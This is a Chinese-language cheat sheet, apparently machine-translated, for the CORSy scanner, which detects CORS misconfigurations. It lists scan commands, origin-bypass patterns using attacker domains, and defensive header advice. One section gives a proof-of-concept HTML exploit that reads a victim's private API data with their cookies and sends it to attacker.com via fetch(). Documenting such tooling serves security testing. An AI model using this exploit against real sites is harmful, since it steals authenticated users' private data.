<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="网络安全">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p对齐=“中心”>
  <b>🌐快速、全面的 CLI 工具，旨在检测跨源资源共享 (CORS) 错误配置并测试跨源数据盗窃风险</b>
</p>

---

## 📋 目录

- [概述和 CORS 漏洞基础知识](#-overview--cors-vulnerability-basics)
  - [致命三人组：起源反射 + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [安装](#-安装)
- [基本目标扫描](#-basic-target-scanning)
- [测试 CORS 攻击向量](#-cors-attack-vectors-tested)
  - [任意原点反射](#任意原点反射)
  - [信任空源 (`Origin: null`)](#trusting-null-origin-origin-null)
  - [前缀和后缀正则表达式绕过](#prefix--suffix-regex-bypass)
  - [通配符子域信任](#wildcard-subdomain-trust)
  - [特殊字符绕过（`_`、`;`、`!`）](#special-character-bypass----)
- [多目标扫描&输出导出](#-multi-target-scanning--output-export)
- [制作概念验证 (PoC) 漏洞](#-crafting-proof-of-concept-poc-exploits)
- [快速参考表](#-quick-reference-table)
- [防御注意事项和安全标头](#-defective-considerations--secure-headers)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 CORS 漏洞基础知识

**跨源资源共享 (CORS)** 是一种浏览器安全机制，允许 Web 服务器放宽 **同源策略 (SOP)**。通过返回标头，例如：
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

Web 应用程序授予其他网站代表受害者用户读取其 HTTP 响应的权限。

### 致命三重奏：起源反射 + 凭证真实
当应用程序盲目地在 `Access-Control-Allow-Origin` 中反映传入的 `Origin` 标头并启用 `Access-Control-Allow-Credentials: true` 时，任何恶意网站都可以强制经过身份验证的访问者的浏览器读取私人消息、API 密钥和帐户详细信息。

**CORSy** 由 **Somdev Sangwan (s0md3v)** 创建，系统地探测具有 16 多个已知来源排列的端点，以发现这些错误配置。

---

## 📥 安装
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 基本目标扫描

扫描单个 Web 应用程序端点：
```bash
python3 corsy.py -u https://target.com/api/user/details
```
添加自定义标头或会话 cookie：
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ CORS 攻击向量已测试

CORSy 自动测试几种原点排列模式：

### 任意原点反射
服务器盲目镜像任何域：
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### 信任空源 (`Origin: null`)
应用程序可能信任 `null` 来源（常见于本地沙盒 iframe 或 `data:` URL）：
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*可以通过使用 `sandbox="allow-scripts allow-top-navigation"` 从 iframe 加载受害者 API 来触发。*

### 前缀和后缀正则表达式绕过
正则表达式验证不佳（例如 `.*target.com` 或 `target.com.*`）：
- `https://target.com.attacker.com`
- `https://not-target.com`

### 特殊字符绕过（`_`、`;`、`!`）
浏览器和服务器处理 URI 分隔符的方式不同：
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 多目标扫描&输出导出

扫描从侦察中发现的大量 API 端点列表：
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 打造概念验证 (PoC) 漏洞

当 CORSy 确认允许的凭据配置错误时，生成 HTML 漏洞来窃取敏感数据：
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **扫描单个 URL** | `python3 corsy.py -u <URL>` |
| **使用会话 Cookie 扫描** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **扫描网址列表** | `python3 corsy.py -i targets.txt` |
| **多线程扫描** | `python3 corsy.py -i targets.txt -t 20` |
| **导出为 JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ 防御考虑和安全标头

1. **永远不要任意反映来源：** 将 `Origin` 标头与显式、严格的服务器端白名单进行比较。
2. **切勿将通配符与凭据配对：** 浏览器会阻止 `Access-Control-Allow-Origin: *` 与 `Credentials: true`，但绝不动态模拟它。
3. **避免信任 `null`：** 不要将 `null` 添加到可信来源策略。

---

## ⚠️ 法律免责声明

> [!警告]
> CORSy 严格用于授权安全评估、渗透测试和防御审计。未经授权的测试网站是非法的。